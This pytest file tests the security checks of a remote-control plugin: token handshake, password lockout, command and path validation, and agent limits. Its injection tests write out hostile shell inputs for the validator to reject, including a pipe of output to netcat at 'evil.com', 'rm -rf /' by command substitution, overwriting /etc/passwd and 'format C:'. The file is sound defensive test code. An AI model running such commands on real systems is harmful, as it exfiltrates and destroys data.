"""
tests/test_security.py - V0.9.0
Security-focused tests: token auth, second-factor password, injection attempts.
Uses FakeWS for proper async-for behavior.
"""

from __future__ import annotations

import copy
import json
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import __init__ as plugin


# ---------------------------------------------------------------------------
# FakeWS — proper async-iterable websocket simulator
# ---------------------------------------------------------------------------
class FakeWS:
    def __init__(self, messages, peer=("127.0.0.1", 50000)):
        self._msgs = list(messages)
        self._idx = 0
        self.sent = []
        self.remote_address = peer
        self.secure = False

    def __aiter__(self):
        return self

    async def __anext__(self):
        if self._idx >= len(self._msgs):
            raise StopAsyncIteration
        val = self._msgs[self._idx]
        self._idx += 1
        return val

    async def recv(self):
        if self._idx >= len(self._msgs):
            raise plugin.websockets.exceptions.ConnectionClosed(None, None)
        val = self._msgs[self._idx]
        self._idx += 1
        return val

    async def send(self, data):
        self.sent.append(data)

    async def close(self):
        pass


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def fresh_cfg(**overrides):
    cfg = copy.deepcopy(plugin.get_config(None))
    cfg.update(overrides)
    return cfg


async def make_server(cfg, tmp_path, ctx=None):
    if ctx is None:
        ctx = MagicMock()
    audit = plugin.AuditLogger(tmp_path / "audit.jsonl")
    srv = plugin.WinRemoteServer(ctx, cfg, audit)

    async def fake_serve(handler, host, port, path=None, **kw):
        fake_serve.handler = handler
        fake = MagicMock()
        fake.close = AsyncMock()
        fake.wait_closed = AsyncMock()
        return fake

    # 如果 websockets 未安装（测试环境常见），mock 整个模块
    if plugin.websockets is None:
        fake_ws_module = MagicMock()
        fake_ws_module.serve = fake_serve
        with patch.object(plugin, "websockets", fake_ws_module):
            await srv.start()
    else:
        with patch.object(plugin.websockets, "serve", side_effect=fake_serve):
            await srv.start()

    return srv, fake_serve


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------
@pytest.fixture()
def cfg() -> dict:
    return fresh_cfg()


# ---------------------------------------------------------------------------
# Token / handshake
# ---------------------------------------------------------------------------
class TestHandshake:
    async def test_missing_token_rejected(self, tmp_path):
        """When secret_token is empty, server rejects with 'server misconfigured'."""
        cfg = fresh_cfg(secret_token="")
        ctx = MagicMock()
        srv, _ = await make_server(cfg, tmp_path, ctx)

        ws = FakeWS(
            [json.dumps({"type": "handshake", "token": "", "agent_id": "x"})],
            peer=("10.0.0.1", 50010),
        )
        with patch("asyncio.sleep", new=AsyncMock()):
            await srv._handle_agent(ws)

        assert ws.sent, f"Expected at least one message, got {ws.sent}"
        sent_strs = [str(s) for s in ws.sent]
        assert any("misconfig" in s.lower() for s in sent_strs)
        await srv.stop()

    async def test_bad_token_rejected(self, tmp_path):
        cfg = fresh_cfg(secret_token="correct-horse")
        ctx = MagicMock()
        srv, _ = await make_server(cfg, tmp_path, ctx)

        ws = FakeWS(
            [json.dumps({"type": "handshake", "token": "wrong", "agent_id": "x"})],
            peer=("10.0.0.2", 50011),
        )
        with patch("asyncio.sleep", new=AsyncMock()):
            await srv._handle_agent(ws)

        assert ws.sent, f"Expected error message, got nothing. sent={ws.sent}"
        sent_strs = [str(s) for s in ws.sent]
        assert any("invalid" in s.lower() for s in sent_strs)
        await srv.stop()


# ---------------------------------------------------------------------------
# PasswordGuard
# ---------------------------------------------------------------------------
class TestPasswordGuard:
    async def test_ban_after_max_attempts(self) -> None:
        g = plugin.PasswordGuard(max_attempts=3, ban_duration=10)
        for _ in range(3):
            ok, reason = await g.check("1.1.1.1", "wrong", "right")
            assert ok is False
        banned = await g.is_banned("1.1.1.1")
        assert banned is True

    async def test_correct_password_resets(self) -> None:
        g = plugin.PasswordGuard(max_attempts=3, ban_duration=10)
        await g.check("2.2.2.2", "wrong", "right")
        ok, reason = await g.check("2.2.2.2", "right", "right")
        assert ok is True
        assert "2.2.2.2" not in g._attempts

    async def test_banned_peer_rejected(self) -> None:
        g = plugin.PasswordGuard(max_attempts=2, ban_duration=60)
        for _ in range(2):
            await g.check("3.3.3.3", "bad", "good")
        # Even with correct password, banned peer is rejected
        ok, reason = await g.check("3.3.3.3", "good", "good")
        assert ok is False


# ---------------------------------------------------------------------------
# Injection patterns
# ---------------------------------------------------------------------------
class TestInjectionPatterns:
    def test_pipe_to_netcat(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell whoami | nc evil.com 4444", cfg)
        assert ok is False
        assert "injection" in reason

    def test_command_substitution(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell echo $(rm -rf /)", cfg)
        assert ok is False

    def test_backtick_substitution(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell `id`", cfg)
        assert ok is False

    def test_write_to_etc(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell echo x > /etc/passwd", cfg)
        assert ok is False

    def test_format_c_drive(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell format C:", cfg)
        assert ok is False
        assert "blacklist" in reason or "dangerous" in reason


# ---------------------------------------------------------------------------
# Path validation edge cases
# ---------------------------------------------------------------------------
class TestPathValidation:
    def test_traversal_attempt(self, cfg: dict) -> None:
        cfg["path_whitelist"] = ["C:\\Allowed"]
        ok, reason = plugin.validate_path("C:\\Allowed\\..\\secret.txt", cfg)
        assert ok is False

    def test_empty_path(self, cfg: dict) -> None:
        ok, reason = plugin.validate_path("", cfg)
        assert ok is False

    def test_whitelist_no_match(self, cfg: dict) -> None:
        cfg["path_whitelist"] = ["D:\\OnlyThis"]
        ok, _ = plugin.validate_path("C:\\Elsewhere\\file.txt", cfg)
        assert ok is False

    def test_dollar_sign_rejected(self, cfg: dict) -> None:
        cfg["path_whitelist"] = ["C:\\"]
        cfg["path_blacklist_keywords"] = ["$", ".."]
        ok, reason = plugin.validate_path("C:\\$env:USERNAME", cfg)
        assert ok is False


# ---------------------------------------------------------------------------
# AgentManager
# ---------------------------------------------------------------------------
class TestAgentManager:
    async def test_max_agents_enforced(self) -> None:
        mgr = plugin.AgentManager(max_agents=2)
        a1 = plugin.AgentConnection(ws=MagicMock(), agent_id="a1")
        a2 = plugin.AgentConnection(ws=MagicMock(), agent_id="a2")
        a3 = plugin.AgentConnection(ws=MagicMock(), agent_id="a3")
        assert await mgr.add(a1) is True
        assert await mgr.add(a2) is True
        assert await mgr.add(a3) is False  # rejected
        assert len(await mgr.list()) == 2

    async def test_prune_dead(self) -> None:
        mgr = plugin.AgentManager(max_agents=4)
        alive = plugin.AgentConnection(ws=MagicMock(), agent_id="live")
        dead = plugin.AgentConnection(ws=MagicMock(), agent_id="dead")
        dead.last_heartbeat -= 100  # old
        await mgr.add(alive)
        await mgr.add(dead)
        dead_ids = await mgr.prune(timeout=15)
        assert "dead" in dead_ids
        assert "live" not in dead_ids


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
